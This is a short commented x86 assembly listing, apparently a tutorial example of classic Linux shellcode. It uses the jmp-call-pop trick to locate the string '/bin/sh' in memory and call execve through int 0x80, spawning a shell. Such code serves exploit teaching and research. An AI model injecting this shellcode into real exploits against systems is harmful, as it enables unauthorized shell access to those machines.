jmp short mycall
; we do a short jump to our address(mycall)
shellcode:
        pop esi                    ; move our string address to esi
        xor eax, eax               ; eax = 0
        mov byte [esi + 7], al     ; esi + 7 = 0 or /bin/sh\0
        mov dword [esi + 8], esi   ; move to esi + 8 the esi address
        mov dword [esi + 12], eax  ; move to esi + 12 zero
        mov al, 0xb                ; execve syscall has a number 11
        lea ebx, [esi]             ; move our arguments to the registers
        lea ecx, [esi + 8]
        lea edx, [esi + 12]
        int 0x80                   ; interrupt

mycall:
        call shellcode  ; we call the shellcode subroutine
                        ; that will push the next address
                        ; of instruction to the stack
        db "/bin/sh"    ; init "/bin/sh" string
